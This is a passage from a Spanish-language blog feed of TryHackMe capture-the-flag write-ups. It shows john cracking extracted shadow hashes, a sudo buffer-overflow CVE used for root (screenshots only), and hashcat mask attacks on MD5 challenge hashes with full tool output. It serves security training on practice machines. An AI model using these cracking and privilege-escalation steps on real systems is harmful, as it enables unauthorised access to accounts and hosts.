&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜ john shadow_hashes --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/sckull/vmware/share/ctf/tmp/wordlists/cherry-blossom.list
Loaded &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; password hashes with &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; different salts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;crypt, generic crypt&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?/64&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
0g 0:00:00:12 27% 0g/s 222.5p/s 452.9c/s 452.9C/s &lt;span class=&#34;nv&#34;&gt;$hickory&lt;/span&gt;$..&lt;span class=&#34;nv&#34;&gt;$happiness&lt;/span&gt;
0g 0:00:00:23 52% 0g/s 225.1p/s 454.5c/s 454.5C/s &lt;span class=&#34;nv&#34;&gt;$3&lt;/span&gt;x!4l!f3..&lt;span class=&#34;nv&#34;&gt;$20&lt;/span&gt;robyn06$
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...s&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;johan&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:00:36 100% 0.02721g/s 270.0p/s 452.9c/s 452.9C/s &lt;span class=&#34;c1&#34;&gt;#2lovely..#2little&lt;/span&gt;
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
➜  
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Cambiamos al usuario johan y obtenemos nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cherryblossom/Screenshot_20200221_235648_johan.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Utilizamos sudo, pero notamos que al ingresar la contraseña, esta, se muestra en pantalla como asteriscos (esto nos recuerda a la maquina &lt;a href=&#34;https://tryhackme.com/room/sudovulnsbof&#34;&gt;&lt;strong&gt;SUDO&lt;/strong&gt;&lt;/a&gt;):&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cherryblossom/Screenshot_20200222_001855.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el exploit de &lt;strong&gt;CVE-2019-18364&lt;/strong&gt; para explotar la vulnerabilidad de buffer overflow que tiene sudo:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cherryblossom/Screenshot_20200222_002037.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell con usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/cherryblossom/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/cherryblossom/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Password Cracking</title>
        <link>https://sckull.github.io/posts/password_cracking_thm/</link>
        <pubDate>Thu, 20 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 20 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/password_cracking_thm/</guid>
        <description>Password Cracking es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.</description>
        <content:encoded>&lt;p&gt;Password Cracking es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/passwordcracking/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;password cracking&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;crack the password by using different techniques&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;1985&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/F4_U57&#34;&gt;F4_U57&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;a href=&#34;https://laconicwolf.com/2018/09/29/hashcat-tutorial-the-basics-of-cracking-passwords-with-hashcat/&#34;&gt;&lt;strong&gt;Hashcat - Tutorial the basics of cracking password&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;bruteforce-md5&#34;&gt;Bruteforce MD5&lt;/h2&gt;
&lt;p&gt;En esta serie de retos se utilizará hashcat para poder obtener la flag de cada uno de los retos. La lista de caracteres que se utilizarán para obtener las flags:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;?l &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; abcdefghijklmnopqrstuvwxyz
?u &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0123456789&lt;/span&gt;
?h &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 0123456789abcdef
?H &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 0123456789ABCDEF
?s &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; «space»!&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;%&amp;amp;&amp;#39;()*+,-./:;&amp;lt;=&amp;gt;?@[\]^_`{|}~
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;?a = ?l?u?d?s
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;?b = 0x00 – 0xff
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;md5-1&#34;&gt;MD5 #1&lt;/h3&gt;
&lt;p&gt;Reto:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;eedb694a362f8ab2effbad5e4c8fa095
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; -m &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; hash.txt TRY-HACK-ME-?d?d?d
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

* Device &lt;span class=&#34;c1&#34;&gt;#1: WARNING! Kernel exec timeout is not disabled.&lt;/span&gt;
             This may cause &lt;span class=&#34;s2&#34;&gt;&amp;#34;CL_OUT_OF_RESOURCES&amp;#34;&lt;/span&gt; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;

ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

eedb694a362f8ab2effbad5e4c8fa095:TRY-HACK-ME-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: eedb694a362f8ab2effbad5e4c8fa095
Time.Started.....: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:32:56 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Time.Estimated...: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:32:56 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Mask.......: TRY-HACK-ME-?d?d?d &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;15&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Speed.#1.........:  4765.5 kH/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.01ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:1024 Loops:1 Thr:256 Vec:1
Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
Progress.........: 1000/1000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Rejected.........: 0/1000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Point....: 0/1000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: TRY-HACK-ME-123 -&amp;gt; TRY-HACK-ME-573
Hardware.Mon.#1..: Temp: 53c Util: 16% Core:1189MHz Mem:2505MHz Bus:4

Started: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:32:51 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
Stopped: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:32:57 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
sckull@uplifted:~/tools/hashcat$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;md5-2&#34;&gt;MD5 #2&lt;/h3&gt;
&lt;p&gt;Reto:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;eedb694a362f8ab2effbad5e4c8fa095
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; -m &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; hash.txt TRY-HACK-ME-?d?d?d?d
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

* Device &lt;span class=&#34;c1&#34;&gt;#1: WARNING! Kernel exec timeout is not disabled.&lt;/span&gt;
             This may cause &lt;span class=&#34;s2&#34;&gt;&amp;#34;CL_OUT_OF_RESOURCES&amp;#34;&lt;/span&gt; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;

ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

19b489d1c4220946b38d65a7fce24372:TRY-HACK-ME-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: 19b489d1c4220946b38d65a7fce24372
Time.Started.....: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:35:18 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Time.Estimated...: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:35:18 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Mask.......: TRY-HACK-ME-?d?d?d?d &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;16&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Speed.#1.........: 13550.0 kH/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.12ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:1024 Loops:1 Thr:256 Vec:1
Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
